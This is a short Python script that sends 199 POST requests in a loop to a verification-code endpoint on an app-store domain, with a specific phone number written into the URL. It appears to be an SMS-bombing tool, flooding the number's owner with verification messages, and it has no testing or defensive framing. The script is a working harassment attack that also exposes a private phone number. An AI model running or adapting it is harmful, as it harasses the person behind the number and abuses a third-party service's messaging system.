import requests

url = "https://khafan.myket.ir/api/v1/khafan/send-verification/09014274059"

payload = "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"i\"\r\n\r\ntest\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
headers = {}
i = 1
while i < 200:
  requests.request("POST", url, data=payload, headers=headers)
  print(i)
 
  i += 1
